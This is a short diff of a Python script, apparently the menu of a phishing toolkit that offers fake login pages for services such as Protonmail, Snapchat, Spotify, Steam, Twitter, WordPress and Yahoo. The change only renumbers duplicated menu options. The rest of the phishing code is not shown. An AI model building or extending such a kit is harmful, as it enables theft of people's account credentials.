@@ -91,9 +91,9 @@ print ('\x1b[1;32;40m' +'press (11) to use  protonmail phishing''\x1b[0m')
 print ('\x1b[1;32;40m' +'press (12) to use  snapchat phishing''\x1b[0m')
 print ('\x1b[1;32;40m' +'press (13) to use  spotify phishing''\x1b[0m')
 print ('\x1b[1;32;40m' +'press (14) to use  steam phishing''\x1b[0m')
-print ('\x1b[1;32;40m' +'press (14) to use  twitter phishing''\x1b[0m')
-print ('\x1b[1;32;40m' +'press (14) to use  wordpress phishing''\x1b[0m')
-print ('\x1b[1;32;40m' +'press (15) to use  yahoo phishing''\x1b[0m')
+print ('\x1b[1;32;40m' +'press (15) to use  twitter phishing''\x1b[0m')
+print ('\x1b[1;32;40m' +'press (16) to use  wordpress phishing''\x1b[0m')
+print ('\x1b[1;32;40m' +'press (17) to use  yahoo phishing''\x1b[0m')
 stphish = input ("wich type of phishing do you want to use ? : ")
 
 if stphish =="1":
